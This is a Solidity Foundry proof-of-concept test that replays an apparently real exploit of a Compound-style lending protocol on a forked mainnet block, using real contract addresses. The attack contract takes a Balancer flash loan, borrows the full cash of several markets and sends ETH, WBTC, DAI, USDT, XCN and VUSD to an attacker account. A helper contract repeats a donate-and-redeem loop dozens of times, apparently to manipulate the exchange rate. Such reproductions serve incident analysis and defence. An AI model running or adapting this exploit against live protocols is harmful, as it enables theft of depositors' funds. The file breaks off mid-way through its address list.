
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 20834657;
    uint256 constant TX_TIMESTAMP = 1727352119;
    uint256 constant TX_BLOCK_NUMBER = 20834658;
    uint256 constant TX_VALUE = 0;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"));
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _etchHelpers();
        attack.bindHelper(Addresses.attack_helper);
        _expectOutcome(address(attack), Addresses.attack_helper);
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _etchHelpers() internal {
        vm.etch(Addresses.attack_helper, type(AttackerHelper).runtimeCode);
        vm.allowCheatcodes(Addresses.attack_helper);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.ZERO, "ETH", 2962743866393322337);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.VUSD, "VUSD", 3807530423553);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.WBTC, "WBTC", 22990636);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.DAI, "DAI", 5148046590995580075613);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.XCN, "XCN", 7350326135730346092551099);
        _expectProfit(Addresses.attacker_eoa, address(0), Addresses.USDT, "USDT", 50780121544);
        _expectProfit(Addresses.attack_contract, attack, Addresses.oETH, "oETH", 8985432546);
        _expectProfit(Addresses.attack_contract, attack, Addresses.WETH, "WETH", 14048771750152448172);
    }
}

contract OurAttack {




    AttackerHelper public helper;

    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        {
            _recordBalancerFlash(_addressArray1(Addresses.WETH));
            if (address(this) != address(this)) {
                (bool ok,) = address(this)
                    .call(
                        abi.encodeWithSignature(
                            "recordBalancerFlashLoanPreBalances(address[])", _addressArray1(Addresses.WETH)
                        )
                    );
                ok;
            }
            IBalancerVault(Addresses.BalancerVault)
                .flashLoan(
                    address(this), _addressArray1(Addresses.WETH), _uintArray1(2000000000000000000000), hex"3030"
                );
        }
    }

    function flashCallback() internal {
        _markCallback(1);
        flashCallback2();
        flashCallback3();
        flashCallback4();
    }

    function flashCallback2() internal {
        uint256 wethBalanceOfAttackAttackContract = IERC20Like(Addresses.WETH).balanceOf(address(this));
        {
            IWETH(Addresses.WETH).withdraw(wethBalanceOfAttackAttackContract);
        }
        uint256 oETHGetCashReturn = IoETH(Addresses.oETH).getCash();
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(11)), bytes32(uint256(3120992194061734426)));
        IoETH(Addresses.oETH).mint{value: 1999500000000000000000}();
        {
            bytes memory replayCallData = hex"b0772d0b";
            (bool ok,) = Addresses.Unitroller.call(replayCallData);
            require(ok, "replay selector 0xb0772d0b failed");
        }
        IUnitroller(Addresses.Unitroller)
            .enterMarkets(
                _addressArray10(
                    Addresses.oETH,
                    Addresses.oBTC,
                    Addresses.oUSDT,
                    Addresses.OErc20Delegator,
                    Addresses.oDAI,
                    Addresses.A_BF4401_6E11,
                    Addresses.A_354A00_4E77,
                    Addresses.A_930692_123E,
                    Addresses.oXCN,
                    Addresses.oVUSD
                )
            );
        IoETH(Addresses.oETH).getCash();
        {
            IoETH(Addresses.oETH).borrow(oETHGetCashReturn);
        }
        {
            uint256 nativeTransferAmount = address(this).balance;
            if (nativeTransferAmount > 3120992194061734426) nativeTransferAmount = 3120992194061734426;
            (bool ok,) = payable(Addresses.attacker_eoa).call{value: nativeTransferAmount}("");
            if (!ok)
            {  }
        }
        uint256 oXCNGetCashReturn = IoXCN(Addresses.oXCN).getCash();
        {
            IoXCN(Addresses.oXCN).borrow(oXCNGetCashReturn);
        }
        IoXCN(Addresses.oXCN).underlying();
        {
            IERC20Like(Addresses.XCN).transfer(Addresses.attacker_eoa, oXCNGetCashReturn);
        }
        uint256 oDAIGetCashReturn = IoDAI(Addresses.oDAI).getCash();
        {
            IoDAI(Addresses.oDAI).borrow(oDAIGetCashReturn);
        }
        IoDAI(Addresses.oDAI).underlying();
        {
            IERC20Like(Addresses.DAI).transfer(Addresses.attacker_eoa, oDAIGetCashReturn);
        }
        uint256 oBTCGetCashReturn = IoBTC(Addresses.oBTC).getCash();
        {
            IoBTC(Addresses.oBTC).borrow(oBTCGetCashReturn);
        }
    }

    function flashCallback3() internal {
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(11)), bytes32(uint256(3120992194061734426)));
        IoBTC(Addresses.oBTC).underlying();
        {
            uint256 wbtcTransferAmount = 22990636;
            IERC20Like(Addresses.WBTC).transfer(Addresses.attacker_eoa, wbtcTransferAmount);
        }
        uint256 oUSDTGetCashReturn = IoUSDT(Addresses.oUSDT).getCash();
        {
            IoUSDT(Addresses.oUSDT).borrow(oUSDTGetCashReturn);
        }
        IoUSDT(Addresses.oUSDT).underlying();
        {
            IERC20Like(Addresses.USDT).transfer(Addresses.attacker_eoa, oUSDTGetCashReturn);
        }
        IUnitroller(Addresses.Unitroller).getAccountLiquidity(address(this));
        IUnitroller(Addresses.Unitroller).oracle();
        IChainlinkOracle(Addresses.ChainlinkOracle).getUnderlyingPrice(Addresses.oVUSD);
        IoVUSD(Addresses.oVUSD).borrow(4107530423554);
        {
            address created = Addresses.attack_helper;
            require(created.code.length != 0, "replay helper runtime missing");
        }
        AttackerHelper(payable(Addresses.attack_helper))._helper2();
        _callValue(Addresses.attack_helper, 500000000000000000, hex"");
        AttackerHelper(payable(Addresses.attack_helper)).helperCb();
        {
            Harness.vmExt().startPrank(address(this));
            IERC20Like(Addresses.VUSD).transfer(Addresses.A_4F8B8C_D068, 1);

            Harness.vmExt().stopPrank();
        }
        INFTLiquidationProxy(Addresses.NFTLiquidationProxy)
            .liquidateWithSingleRepay(
                address(this), Addresses.A_AD4581_A248, Addresses.A_4F8B8C_D068, 4764735291322
            );
        IERC20Like(Addresses.VUSD).approve(Addresses.SwapRouter, 300000000000);
        {
            uint256 swapAmt = 300000000000;
            ISwapRouter(Addresses.SwapRouter)
                .exactInputSingle(
                    Abi_exactInputSingle_Param0({
                        field0: Addresses.VUSD,
                        field1: Addresses.WETH,
                        field2: 3000,
                        field3: address(this),
                        field4: 1727352120,
                        field5: swapAmt,
                        field6: 0,
                        field7: 0
                    })
                );
        }
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 1942134238698307728556) depositAmount = 1942134238698307728556;
            if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        }
        {
            uint256 wethTransferAmount = 2000000000000000000000;
            IERC20Like(Addresses.WETH).transfer(Addresses.BalancerVault, wethTransferAmount);
        }
        IERC20Like(Addresses.VUSD).balanceOf(address(this));
    }

    function flashCallback4() internal {
        Harness.vmExt()
            .store(Addresses.attack_contract, bytes32(uint256(11)), bytes32(uint256(3120992194061734426)));
        {
            uint256 transferActionGraphAmount = 3807530423553;
            IERC20Like(Addresses.VUSD).transfer(Addresses.attacker_eoa, transferActionGraphAmount);
        }
    }

    function _attack2() internal {
        _markCallback(2);
    }

    receive() external payable {}

    function receiveFlashLoan(
        address[] calldata arg0,
        uint256[] calldata arg1,
        uint256[] calldata arg2,
        bytes calldata arg3
    ) external payable {
        arg0;
        arg1;
        arg2;
        arg3;
        flashCallback();
        bytes memory ret = hex"";
        assembly { return(add(ret, 32), mload(ret)) }
    }

    fallback() external payable {
        if (msg.sig == 0xce30fb6a) {
            _attack();
            return;
        }
        _entryCb();
    }

    function _entryCb() internal {}

    function bindHelper(address attackHelper) external {
        helper = AttackerHelper(payable(attackHelper));
    }

    function _boundAttack(bytes memory data) internal {
        _decodedCall(address(helper), data);
    }

    function _decodedCall(address target, bytes memory data) internal {
        (bool ok,) = target.call(data);
        require(ok, "helper dispatch failed");
    }

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetHelper, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for helper replay");
        (bool ok, bytes memory out) = targetHelper.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "helper replay failed");
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray10(
        address a0,
        address a1,
        address a2,
        address a3,
        address a4,
        address a5,
        address a6,
        address a7,
        address a8,
        address a9
    ) internal pure returns (address[] memory out) {
        out = new address[](10);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
        out[5] = a5;
        out[6] = a6;
        out[7] = a7;
        out[8] = a8;
        out[9] = a9;
    }
}

contract AttackerHelper {
    receive() external payable {}

    fallback() external payable {
        if (msg.sig == 0x95786b1c) {
            _helperCb();
            return;
        }
        _entryCb();
    }

    function helperCb() external payable {
        _helperCb();
        return;
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }

    function _callValue(address targetHelper, uint256 value, bytes memory data) internal {
        require(value == 0 || address(this).balance >= value, "insufficient ETH for helper replay");
        (bool ok, bytes memory out) = targetHelper.call{value: value}(data);
        if (!ok && out.length > 0) assembly { revert(add(out, 32), mload(out)) }
        require(ok, "helper replay failed");
    }

    function _addressArray1(address a0) internal pure returns (address[] memory out) {
        out = new address[](1);
        out[0] = a0;
    }

    function _uintArray1(uint256 a0) internal pure returns (uint256[] memory out) {
        out = new uint256[](1);
        out[0] = a0;
    }

    function _addressArray10(
        address a0,
        address a1,
        address a2,
        address a3,
        address a4,
        address a5,
        address a6,
        address a7,
        address a8,
        address a9
    ) internal pure returns (address[] memory out) {
        out = new address[](10);
        out[0] = a0;
        out[1] = a1;
        out[2] = a2;
        out[3] = a3;
        out[4] = a4;
        out[5] = a5;
        out[6] = a6;
        out[7] = a7;
        out[8] = a8;
        out[9] = a9;
    }

    function _helperCb() internal {
        {
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
            IoETH(Addresses.oETH).exchangeRateStored();
            {
                (bool ok,) = payable(Addresses.oETH).call{value: 215227348}("");
                if (!ok)
                {  }
            }
            IoETH(Addresses.oETH).exchangeRateStored();
            IoETH(Addresses.oETH).redeemUnderlying(430454691);
        }
        _callValue(Addresses.attack_contract, 500000011837503865, hex"");
    }

    function _helper() public {}

    function _helper2() public {}
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct AttackCall {
    address target;
    bytes data;
}

interface VmExt {
    function store(address target, bytes32 slot, bytes32 value) external;
    function startPrank(address msgSender) external;
    function stopPrank() external;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant VUSD = 0x0BFFDD787C83235f6F0afa0Faed42061a4619B7a;
    address internal constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address internal constant oUSDT = 0x2C6650126B6E0749f977D280c98415ed05894711;
    address internal constant oETH = 0x2CCb7d00a9E10D0c3408B5EEfb67011aBfaCb075;
    address internal constant NFTLiquidationProxy = 0x323398DE3C35F96053D930d25FE8d92132F83d44;
    address internal constant A_354A00_4E77 = 0x354a006C570a7F581c30c9DBF9Fdd79330764E77;
    address internal constant ChainlinkOracle = 0x3a07339C1587397129BD905C95ED15b03A4A36f7;
    address internal constant A_3F100C_DC0E = 0x3f100c9E9b9C575fE73461673f0770435575DC0e;
    address internal constant FiatTokenV2_2 = 0x43506849D7C04F9138D1A2050bbF3A0c054402dd;
    address internal constant A_4F8B8C_D068 = 0x4F8B8C1B828147C1d6EfC37C0326F4Ac3E47d068;
    address internal constant attacker_eoa = 0x680910cf5Fc9969A25Fd57e7896A14fF1E55F36B;
    address internal constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address internal constant OErc20Delegator = 0x7a55671041869ec8e36f1E216031b0aB75670091;
    address internal constant oBTC = 0x7a89e16Cc48432917C948437AC1441b78D133A16;
    address internal constant A_88AD8E_3A1C = 0x88aD8e1589B00fFCFe2F6FDdbfc959377edD3A1C;
    address internal constant A_930692_123E = 0x93069250CFEF3514334ead881FCCc407b855123e;
